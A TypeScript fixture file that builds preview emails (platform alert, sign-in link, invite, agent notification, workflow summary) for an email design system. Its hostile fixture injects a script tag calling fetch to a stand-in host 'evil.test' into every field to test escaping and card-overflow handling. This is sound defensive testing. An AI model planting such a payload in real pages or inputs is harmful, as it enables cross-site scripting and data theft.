/**
 * Fixture content for every email the platform sends.
 *
 * Governed by docs/plans/active/email-design-system-plan.md.
 *
 * These go through the real builders, not a copy of them, so the preview cannot
 * drift from what actually gets sent. The hostile fixture exists because the
 * failure modes worth catching — an unescaped field, an overflowing card list,
 * a 400-character provider payload — are invisible in tidy sample data.
 */

import { buildAgentNotificationEmail } from "../../../../convex/aiToolNotificationService";
import { renderEmail, type RenderedEmail } from "../../../../convex/emailLayoutService";
import {
  buildSystemHealthAlertEmail,
  buildSystemHealthPlatformAlertDecision,
  type OperationalFailureExample,
  type OperationalHealthReport,
  type SystemHealthReport,
} from "../../../../convex/platformAlertService";

const BASE_URL = "https://app.example";
const PLATFORM_NAME = "Sonae";

const EMPTY_BUCKET = { count: 0, examples: [] as OperationalFailureExample[] };

function buildOperations(overrides: Partial<OperationalHealthReport> = {}): OperationalHealthReport {
  return {
    agentFailures: EMPTY_BUCKET,
    failedAgentTransactions: EMPTY_BUCKET,
    failedScheduledExecutions: EMPTY_BUCKET,
    failedToolCalls: EMPTY_BUCKET,
    highCostAgents: EMPTY_BUCKET,
    overdueSchedules: EMPTY_BUCKET,
    pendingApprovals: EMPTY_BUCKET,
    providerFailures: EMPTY_BUCKET,
    schedulesMissingNextRun: EMPTY_BUCKET,
    staleAgentRuns: EMPTY_BUCKET,
    staleRunningScheduledExecutions: EMPTY_BUCKET,
    decisionsHandedToPerson: EMPTY_BUCKET,
    decisionsOnSimpleRules: EMPTY_BUCKET,
    decisionsUnsure: EMPTY_BUCKET,
    ...overrides,
  };
}

function buildReport(operations: OperationalHealthReport): SystemHealthReport {
  return {
    alertRules: [],
    analytics: {
      checkedDates: ["2026-07-29", "2026-07-30", "2026-07-31"],
      daysBack: 7,
      liveToday: { agentTransactions: 0, assistantMessages: 0, date: "2026-07-31" },
      messageDimensions: {
        examples: [],
        mismatched: 0,
        missingDimensions: 0,
        missingThreads: 0,
        scanned: 5,
        windowStartDate: "2026-07-24",
      },
      snapshotCoverage: {
        dates: [],
        duplicateSnapshotGroups: [],
        missingGlobalDates: [],
        totalSnapshots: 14,
      },
    },
    budgetHealth: {
      agentCostBudgets: { count: 0, examples: [] },
      tenantMessageBudgets: { count: 0, examples: [] },
    },
    checkedAt: Date.UTC(2026, 6, 31, 0, 25),
    checkedDate: "2026-07-31",
    daysBack: 7,
    highCostAgentThresholdGBP: 5,
    operations,
    overdueScheduleThresholdMinutes: 30,
    pendingApprovalThresholdMinutes: 60,
    scope: { type: "platform" },
    staleRunningThresholdMinutes: 30,
    windowStartDate: "2026-07-24",
    windowStartTs: Date.UTC(2026, 6, 24),
  };
}

/** Verbatim from the alert Anthony received on 2026-07-31. */
const THOUGHT_SIGNATURE_ERROR =
  '{"error":{"message":"{\\n \\"error\\": {\\n \\"code\\": 400,\\n \\"message\\": \\"Function call is missing a thought_signature in functionCall parts. This is required for tools to work co...';
const APIFY_402_ERROR =
  'Uncaught Error: Apify replied 402 to POST /acts/jKpgGfgRfzrGgEMa8/runs: { "error": { "type": "not-enough-usage-to-run-paid-actor", "message": "By launching this job you will exc...';
const APIFY_SECRET_ERROR =
  "Uncaught Error: APIFY_WEBHOOK_SECRET environment variable is missing. at startApifyActor (../convex/apify.ts:191:33) at handler (../convex/apify.ts:86:20)";

function realAlert(): RenderedEmail {
  const operations = buildOperations({
    agentFailures: {
      count: 4,
      examples: Array.from({ length: 4 }, (_, index) => ({
        id: `log_${index}`,
        label: "ERROR",
        occurredAt: Date.UTC(2026, 6, 29, 16, 39 + index),
        summary: THOUGHT_SIGNATURE_ERROR,
        targetId: "agent_rightmove",
        targetName: "Rightmove Agent",
        targetType: "agent" as const,
      })),
    },
    failedToolCalls: {
      count: 2,
      examples: [
        {
          id: "call_1",
          label: "apify",
          occurredAt: Date.UTC(2026, 6, 30, 7, 40),
          summary: APIFY_402_ERROR,
          targetId: "agent_rightmove",
          targetName: "Rightmove Agent",
          targetType: "agent" as const,
        },
        {
          id: "call_2",
          label: "apify",
          occurredAt: Date.UTC(2026, 6, 29, 16, 35),
          summary: APIFY_SECRET_ERROR,
          targetId: "agent_rightmove",
          targetName: "Rightmove Agent",
          targetType: "agent" as const,
        },
      ],
    },
  });
  const report = buildReport(operations);

  return buildSystemHealthAlertEmail(report, buildSystemHealthPlatformAlertDecision(report), {
    baseUrl: BASE_URL,
    platformName: PLATFORM_NAME,
  });
}

/**
 * Everything that can go wrong at once: markup in every field, a payload far
 * longer than the cause limit, and more signals than the card cap allows.
 */
function hostileAlert(): RenderedEmail {
  // The payload deliberately avoids the native-dialog calls that
  // src/quality-drift.test.ts greps for — it scans source text and cannot tell
  // a string literal from a call. Exfiltration is the more realistic payload
  // for an email anyway, since script never executes in a mail client.
  const nasty = '<script>fetch("//evil.test")</script>';
  const operations = buildOperations({
    agentFailures: {
      count: 40,
      examples: Array.from({ length: 40 }, (_, index) => ({
        id: `log_${index}`,
        label: "ERROR",
        occurredAt: Date.UTC(2026, 6, 29, 12, index),
        summary: `${nasty} ${"A very long provider payload that keeps going. ".repeat(12)}`,
        targetId: "agent_hostile",
        targetName: `Agent ${nasty}`,
        targetType: "agent" as const,
      })),
    },
    overdueSchedules: {
      count: 3,
      examples: [{ id: "s1", label: nasty, summary: nasty, targetName: nasty, targetType: "schedule" }],
    },
    pendingApprovals: {
      count: 9,
      examples: [{ id: "a1", label: nasty, summary: nasty, targetName: nasty, targetType: "workflow" }],
    },
    staleAgentRuns: {
      count: 2,
      examples: [{ id: "r1", label: "RUNNING", summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    providerFailures: {
      count: 6,
      examples: [{ id: "p1", label: nasty, summary: nasty, targetName: nasty }],
    },
    // Past the eight-card cap on purpose, so the overflow line is always on screen.
    failedAgentTransactions: {
      count: 5,
      examples: [{ id: "t1", label: nasty, summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    failedScheduledExecutions: {
      count: 4,
      examples: [{ id: "e1", label: nasty, summary: nasty, targetName: nasty, targetType: "workflow" }],
    },
    failedToolCalls: {
      count: 7,
      examples: [{ id: "c1", label: nasty, summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    highCostAgents: {
      count: 3,
      examples: [{ id: "h1", label: nasty, summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    schedulesMissingNextRun: {
      count: 2,
      examples: [{ id: "n1", label: nasty, summary: nasty, targetName: nasty, targetType: "schedule" }],
    },
    staleRunningScheduledExecutions: {
      count: 8,
      examples: [{ id: "sr1", label: nasty, summary: nasty, targetName: nasty, targetType: "workflow" }],
    },
  });
  const report = buildReport(operations);

  return buildSystemHealthAlertEmail(report, buildSystemHealthPlatformAlertDecision(report), {
    baseUrl: BASE_URL,
    platformName: `${PLATFORM_NAME} ${nasty}`,
  });
}

export type EmailPreview = {
  key: string;
  title: string;
  note: string;
  source: string;
  email: RenderedEmail;
};

export function buildEmailPreviews(): EmailPreview[] {
  return [
    {
      key: "alert",
      title: "Platform alert",
      note: "The 2026-07-31 alert, rebuilt: four identical faults grouped into one card.",
      source: "convex/platformAlertService.ts",
      email: realAlert(),
    },
    {
      key: "alert-hostile",
      title: "Platform alert — hostile fixture",
      note: "Markup in every field, 40 signals against a cap of 8, and an oversized payload.",
      source: "convex/platformAlertService.ts",
      email: hostileAlert(),
    },
    {
      key: "sign-in",
      title: "Sign-in link",
      note: "The magic link. Was the stock Auth.js template until 2026-07-31 — a blue button and the subject \"Sign in to localhost:3000\".",
      source: "convex/auth.ts",
      email: renderEmail(
        {
          kind: "Sign in",
          verdict: `Sign in to ${PLATFORM_NAME}.`,
          paragraphs: [
            "Use the button below and you will be signed in — there is no password to enter.",
          ],
          actions: [{ label: `Sign in to ${PLATFORM_NAME}`, url: `${BASE_URL}/api/auth/verify` }],
          quiet: ["This link works once, and expires in about 15 minutes."],
          footer: {
            lines: [
              "If you did not ask to sign in, ignore this email. Nothing happens until the link is used.",
            ],
          },
        },
        { platformName: PLATFORM_NAME }
      ),
    },
    {
      key: "invite",
      title: "Invite",
      note: "Headline and body come from an editable template record, so both are escaped.",
      source: "convex/invites.ts",
      email: renderEmail(
        {
          kind: "Invitation",
          verdict: "You're in.",
          paragraphs: [
            "Anthony Basker added you to the Acme workspace as an administrator.",
            "Sign in with this address and it will pick you up automatically — there is no password to set.",
          ],
          actions: [{ label: "Sign in to Acme", url: `${BASE_URL}/login` }],
          footer: {
            lines: ["Not expecting this? Ignore it — nothing happens until you sign in."],
          },
        },
        { platformName: PLATFORM_NAME }
      ),
    },
    {
      key: "agent-notification",
      title: "Agent notification",
      note: "Body is model-authored text. The footer states the recipient policy.",
      source: "convex/aiToolNotificationService.ts",
      email: buildAgentNotificationEmail(
        {
          subject: "Four new matches in Guildford",
          body:
            "I collected 986 listings overnight and four clear your criteria — three beds or more, under £500k, chain free.\n\n"
            + "Ash Road, 3 bed semi-detached, £425,000\nChesham Mews, 3 bed end terrace, £465,000\n"
            + "Denzil Road, 3 bed terraced, £399,000\nWodeland Avenue, 2 bed terraced, £380,000",
        },
        { platformName: PLATFORM_NAME }
      ),
    },
    {
      key: "workflow",
      title: "Workflow email node",
      note: "Body is author-written and template-substituted, so it is escaped too.",
      source: "convex/workflowRuntime.ts",
      email: renderEmail(
        {
          kind: "Automation",
          verdict: "Weekly sales summary",
          paragraphs: [
            "Revenue for the week to 30 July was £184,200, up 7.4% on forecast.",
            "Two accounts are flagged for comment. The full breakdown is attached to the run.",
          ],
          footer: { lines: ["Sent by a workflow you or a colleague set up."] },
        },
        { platformName: PLATFORM_NAME }
      ),
    },
  ];
}
